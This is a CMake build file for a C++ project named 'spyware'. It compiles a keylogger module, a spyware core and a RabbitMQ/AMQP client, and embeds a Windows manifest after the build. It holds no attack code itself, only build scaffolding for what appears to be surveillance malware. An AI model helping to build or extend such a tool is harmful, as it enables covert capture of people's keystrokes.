project (spyware)

set ( SOURCES 
    main.cpp 
    # amqp/AmqpConnection.cpp 
    # amqp/AmqpChannel.cpp
    amqp/AmqpClient.cpp
    core/utils.cpp
    core/debug.cpp
    core/authentication.cpp
    core/spyware.cpp
    loggers/keylogger.cpp
)

add_executable (${PROJECT_NAME} ${SOURCES})


target_link_libraries (${PROJECT_NAME} 
    nlohmann_json::nlohmann_json
    rabbitmq::rabbitmq-static
)


if (MSVC)
    add_custom_command(
        TARGET ${PROJECT_NAME}
        POST_BUILD
        COMMAND "mt.exe" -manifest \"${CMAKE_CURRENT_SOURCE_DIR}/${PROJECT_NAME}.exe.manifest\" -outputresource:"$<TARGET_FILE:${PROJECT_NAME}>"\;1
        COMMENT "Adding manifest..." 
    )
endif(MSVC)